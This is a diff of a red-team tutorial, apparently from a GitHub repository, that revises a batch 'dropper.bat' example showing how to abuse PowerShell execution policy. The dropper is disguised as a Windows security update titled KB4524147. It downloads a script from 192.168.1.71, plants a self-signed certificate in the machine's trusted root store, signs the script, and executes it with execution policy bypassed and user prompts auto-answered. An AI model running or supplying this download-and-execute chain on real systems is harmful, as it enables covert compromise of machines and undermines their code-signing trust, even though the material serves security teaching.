@@ -94,18 +94,28 @@ This next step shows us how this technic can be abused (PS Execution Policy bypa
 #### Batch (dropper.bat) Automation Example:
 ```
 @echo off
+color 03
 title Cumulative Security Update KB4524147
 
-:: Code to Download our PS script to 'tmp' remote folder
+echo [1] Set Target PS Execution Policy to 'AllSigned' to test script.
+cmd /c echo Y | powershell Set-ExecutionPolicy AllSigned -Scope CurrentUser
+timeout /T 2 >nul
+
+echo [2] Downloading our PS script to target 'tmp' remote folder.
 powershell -C (New-Object Net.WebClient).DownloadFile('http://192.168.1.71/my_posh_script.ps1', '$env:tmp\my_posh_script.ps1')
 timeout /T 2 >nul
 
-:: Code to digitally sign Our Downloaded PS script (my_posh_script.ps1) { This certificate expires in six months }
-powershell $cert = New-SelfSignedCertificate -Subject "My Code Signing Certificate” -FriendlyName "SsaRedTeam" -NotAfter (Get-Date).AddMonths(6) -Type CodeSigningCert -CertStoreLocation cert:\LocalMachine\My;Move-Item -Path $cert.PSPath -Destination "Cert:\LocalMachine\Root";Set-AuthenticodeSignature -FilePath $env:tmp\my_posh_script.ps1 -Certificate $cert
+echo [3] Digitally sign Our Downloaded PS script (my_posh_script.ps1)
+:: Code to digitally sign Our Downloaded PS script (my_posh_script.ps1) -> { This certificate expires in six months }
+powershell $cert = New-SelfSignedCertificate -Subject "My_Code_Signing_Certificate" -FriendlyName "SsaRedTeam" -NotAfter (Get-Date).AddMonths(6) -Type CodeSigningCert -CertStoreLocation cert:\LocalMachine\My;Move-Item -Path $cert.PSPath -Destination "Cert:\LocalMachine\Root";Set-AuthenticodeSignature -FilePath $env:tmp\my_posh_script.ps1 -Certificate $cert
 timeout /T 2 >nul
 
-:: Code to Execute our Downloaded script
-powershell -Execution Bypass -NoProfile -File "$env:tmp\my_posh_script.ps1"
+echo [4] Executing our Downloaded script and bypass user intervention
+cd %tmp% && cmd /c echo A | powershell -Execution Bypass -NoProfile -File my_posh_script.ps1
+pause
 ```
 **Remark:** This Dropper.bat can Download-PS-Script/Build-Cert/Sign-PS-Script/Execute-PS-Script because the Policy
 its set by Default to powershell Scripts Only (this policy does not affects batch scripts from running and executing all of this)..
+**Remark:** This batch script must be executed with **admin privileges**
+![dff](https://user-images.githubusercontent.com/23490060/72754958-28f39380-3bc1-11ea-8eb8-d2c61351ba14.png)
+
